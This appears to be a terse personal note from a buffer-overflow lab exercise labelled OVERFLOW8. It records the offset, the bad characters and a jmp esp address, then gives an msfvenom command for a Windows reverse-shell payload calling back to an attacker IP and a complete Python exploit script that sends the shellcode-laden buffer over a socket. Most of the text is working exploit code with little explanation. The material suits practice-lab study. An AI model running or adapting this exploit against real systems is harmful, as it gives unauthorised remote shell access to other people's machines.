## fuzzing

![[Pasted image 20210530154629.png]]

## offset

EIP: 68433568

offset: 1786

![[Pasted image 20210530154838.png]]

## bad chars

ESP: 01A0FA30

bad chars: `\x00\x1d\x2e\xc7\xee`

## jmp point

`!mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"`

![[Pasted image 20210530155259.png]]

`625011AF`

little endian: `\xaf\x11\x50\x62`

## exploit 

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x1d\x2e\xc7\xee"`

![[Pasted image 20210530155448.png]]


```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xdb\xc2\xd9\x74\x24\xf4\xba\x80\xd6\x0e\x14\x5b\x29\xc9\xb1"
"\x52\x31\x53\x17\x03\x53\x17\x83\x43\xd2\xec\xe1\xbf\x33\x72"
"\x09\x3f\xc4\x13\x83\xda\xf5\x13\xf7\xaf\xa6\xa3\x73\xfd\x4a"
"\x4f\xd1\x15\xd8\x3d\xfe\x1a\x69\x8b\xd8\x15\x6a\xa0\x19\x34"
"\xe8\xbb\x4d\x96\xd1\x73\x80\xd7\x16\x69\x69\x85\xcf\xe5\xdc"
"\x39\x7b\xb3\xdc\xb2\x37\x55\x65\x27\x8f\x54\x44\xf6\x9b\x0e"
"\x46\xf9\x48\x3b\xcf\xe1\x8d\x06\x99\x9a\x66\xfc\x18\x4a\xb7"
"\xfd\xb7\xb3\x77\x0c\xc9\xf4\xb0\xef\xbc\x0c\xc3\x92\xc6\xcb"
"\xb9\x48\x42\xcf\x1a\x1a\xf4\x2b\x9a\xcf\x63\xb8\x90\xa4\xe0"
"\xe6\xb4\x3b\x24\x9d\xc1\xb0\xcb\x71\x40\x82\xef\x55\x08\x50"
"\x91\xcc\xf4\x37\xae\x0e\x57\xe7\x0a\x45\x7a\xfc\x26\x04\x13"
"\x31\x0b\xb6\xe3\x5d\x1c\xc5\xd1\xc2\xb6\x41\x5a\x8a\x10\x96"
"\x9d\xa1\xe5\x08\x60\x4a\x16\x01\xa7\x1e\x46\x39\x0e\x1f\x0d"
"\xb9\xaf\xca\x82\xe9\x1f\xa5\x62\x59\xe0\x15\x0b\xb3\xef\x4a"
"\x2b\xbc\x25\xe3\xc6\x47\xae\x06\x06\x43\xfe\x7f\x2a\x4b\xdd"
"\x56\xa3\xad\x4b\xb9\xe5\x66\xe4\x20\xac\xfc\x95\xad\x7a\x79"
"\x95\x26\x89\x7e\x58\xcf\xe4\x6c\x0d\x3f\xb3\xce\x98\x40\x69"
"\x66\x46\xd2\xf6\x76\x01\xcf\xa0\x21\x46\x21\xb9\xa7\x7a\x18"
"\x13\xd5\x86\xfc\x5c\x5d\x5d\x3d\x62\x5c\x10\x79\x40\x4e\xec"
"\x82\xcc\x3a\xa0\xd4\x9a\x94\x06\x8f\x6c\x4e\xd1\x7c\x27\x06"
"\xa4\x4e\xf8\x50\xa9\x9a\x8e\xbc\x18\x73\xd7\xc3\x95\x13\xdf"
"\xbc\xcb\x83\x20\x17\x48\xa3\xc2\xbd\xa5\x4c\x5b\x54\x04\x11"
"\x5c\x83\x4b\x2c\xdf\x21\x34\xcb\xff\x40\x31\x97\x47\xb9\x4b"
"\x88\x2d\xbd\xf8\xa9\x67"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```